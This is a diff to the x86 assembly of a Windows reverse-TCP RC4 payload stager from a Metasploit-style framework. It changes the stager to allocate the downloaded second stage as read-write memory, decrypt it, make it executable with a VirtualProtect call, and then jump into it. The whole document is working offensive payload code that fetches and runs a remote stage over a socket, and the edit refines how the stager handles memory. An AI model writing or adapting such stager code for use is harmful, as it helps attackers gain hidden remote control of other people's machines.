@@ -116,7 +116,7 @@ module Payload::Windows::ReverseTcpRc4
         mov esi, [esi]         ; dereference the pointer to the second stage length
           xor esi, #{xorkey}   ; XOR the stage length
           lea ecx, [esi+0x100]  ; ECX = stage length + S-box length (alloc length)
-        push  0x40         ; PAGE_EXECUTE_READWRITE
+        push  0x04         ; PAGE_READWRITE
         push 0x1000            ; MEM_COMMIT
       ; push esi               ; push the newly recieved second stage length.
           push ecx             ; push the alloc length
@@ -178,16 +178,47 @@ module Payload::Windows::ReverseTcpRc4
         jnz read_more          ; continue if we have more to read
           pop ebx              ; address of S-box
           pop ecx              ; stage length
-          pop ebp              ; address of stage
-          push ebp             ; push back so we can return into it
+
+          ; Now, stack top = address of stage
+          ; Now, ebp = api_call
+
+          ; push call params for VirtualProtect
+          push 0               ; tmp var for holding old protect bits 
+          push esp             ; push address of the tmp var
+          push 0x20            ; PAGE_EXECUTE_READ
+          add ecx, 0x100       ; Add the size of scratch space
+          push ecx             ; stage length
+          sub ecx, 0x100
+          push ebx             ; address of S-box
+          push #{Rex::Text.block_api_hash('kernel32.dll', 'VirtualProtect')}
+
+          ; push api_call addr
+          ; so that in the future I can call VirtualProtect easily
+          push ebp
+          
           push edi             ; save socket
           mov edi, ebx         ; address of S-box
+
+          ; data to decode is 0x100 behind scratch space
+          mov ebp, edi                   
+          add ebp, 0x100
+
           call after_key       ; Call after_key, this pushes the address of the key onto the stack.
           db #{raw_to_db(opts[:rc4key])}
       after_key:
         pop esi                ; ESI = RC4 key
       #{asm_decrypt_rc4}
         pop edi              ; restore socket
+    ^
+
+  asm << %Q^
+      ; call VirtualProtect by poping api_call addr and call it
+      pop ebp
+      call ebp               ; call VirtualProtect
+    
+      ; pop the tmp var. The params for VirtualProtect have been popped
+      pop eax
+
       ret                    ; return into the second stage
     ^
 
